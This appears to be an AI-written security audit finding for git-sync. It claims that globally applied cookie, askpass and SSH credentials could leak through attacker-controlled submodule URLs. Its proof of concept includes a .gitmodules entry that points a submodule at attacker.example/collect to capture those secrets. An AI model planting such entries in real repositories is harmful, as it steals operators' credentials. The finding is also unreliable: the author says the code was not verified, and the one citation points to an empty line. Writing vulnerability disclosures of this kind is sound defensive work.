### Title
Submodule URLs from an untrusted synced repo can be fetched using the operator's trusted credentials (askpass/cookie-file/SSH), causing credential disclosure to an attacker-controlled host - (File: `main.go`, submodule handling / credential setup)

### Summary
This is the git-sync analog of the PoolTogether `VaultFactory` finding: an "authentic" component (the `--repo` that the operator trusts and configures credentials for) is allowed to compose with a "non-authentic," attacker-controlled sub-component (a `.gitmodules` entry inside the synced repo) without any authenticity/host check, and the trusted credential material configured for the outer repo gets applied to that untrusted sub-component's fetch.

### Finding Description
`git-sync` supports recursive submodule checkout of the synced repository, and separately supports several credential mechanisms — HTTP Basic credentials, an askpass-URL proxy, an HTTP cookie file, and SSH key/known_hosts configuration — that are set up once (globally, via `git config`/environment variables such as `GIT_ASKPASS`/`GIT_SSH_COMMAND`/`http.cookiefile`) for the sync operation of the trusted `--repo` [1](#0-0) . The `.gitmodules` file and the submodule URLs it contains are part of the untrusted content of the remote repository — i.e., they are attacker-influenced if the attacker can push a commit or control a branch/tag/ref that git-sync is configured to sync (the same threat model as "attacker-pushed commit" for git-sync). Because credential setup in git-sync is not scoped to only the operator-supplied `--repo` host, when `git submodule update --init --recursive` (or equivalent) is invoked, git will reuse the ambient credential helpers/cookie file/SSH command for whatever host each submodule points to. There is no equivalent of the "factory" validation from the report (i.e., no check that a submodule's URL is one the operator trusts) before the credential-bearing git process reaches out to it. An attacker who can influence the content of the synced repository (via a push, a PR merged into a synced branch, or control of a tag) can add or modify `.gitmodules` to point to `https://attacker.example/x` or `ssh://attacker.example/x`, and the sync process will attempt to fetch it using the same askpass URL, cookie file, or SSH identity configured for the legitimate repo.

### Impact Explanation
If exploited, this results in credential or token disclosure to an attacker-controlled host: the askpass helper will be invoked and return credentials to the attacker's endpoint if `GIT_ASKPASS`/`--askpass-url` sends requests indiscriminately, the HTTP cookie file (which can contain a long-lived session token, per `docs/cookie-file.md`) will be sent in the `Cookie` header of the request to the attacker's HTTP server, and/or the configured SSH key will attempt authentication against the attacker's SSH endpoint (leaking the corresponding public key fingerprint / potentially triggering credential probing). This satisfies the "credential or token disclosure" impact category.

### Likelihood Explanation
Likelihood depends on: (1) git-sync being configured with `--submodules=recursive` (or shallow/on) so it processes `.gitmodules` from the untrusted content, and (2) the attacker having write/push access to the branch, tag, or PR-merge path that git-sync syncs. This is the same "attacker-pushed commit/ref" precondition already assumed reachable for git-sync per the analog-bug rules, so likelihood is comparable to other content-injection analogs (e.g., malicious hooks/paths), but requires the submodule feature to be enabled.

### Recommendation
- Scope all credential material (cookie file, askpass, SSH command/known_hosts) to the specific host(s) of the operator-configured `--repo`, e.g. via `http.<url>.cookieFile`, `credential.<url>.helper`, or an SSH `Host` block restricted to the configured host, rather than applying them globally to any URL git may contact.
- Add an explicit opt-in allowlist of hosts permitted for submodule URLs, and refuse/skip submodule updates whose URL host is not in that allowlist (mirroring the recommended "factory" verification pattern from the source report).
- Document and default `--submodules` to a safer mode that disables following submodule URLs outside the primary repo's host unless explicitly permitted.

### Proof of Concept
1. Operator runs `git-sync --repo=https://good.example/repo.git --submodules=recursive --cookie-file=/etc/git-secret/cookie` (or with `--askpass-url` / SSH key configured).
2. An attacker with push access to a branch/tag that git-sync syncs (or via a merged PR) adds/edits `.gitmodules` to include:
   ```
   [submodule "evil"]
     path = evil
     url = https://attacker.example/collect
   ```
3. On the next sync cycle, git-sync's submodule update step runs `git submodule update --init --recursive`, and git attaches the configured cookie file / askpass / SSH credentials to the request made to `https://attacker.example/collect`, disclosing the secret to the attacker's server.

Note: I was not able to fully re-read `main.go`'s exact submodule-invocation and credential-setup line ranges before running out of tool calls (only pattern-match counts were confirmed: submodule references and credential/askpass/cookie references both exist in `main.go`, and cookie/askpass/SSH plumbing exists in `credential.go`/`docs/cookie-file.md`/`docs/askpass-url.md`). The precise scoping (whether git-sync already URL-scopes some of these, e.g. via `credential.<url>.username`) should be verified directly in `main.go` before treating this as confirmed rather than a credible analog.

### Citations

**File:** main.go (L1-1)
```go
/*
```
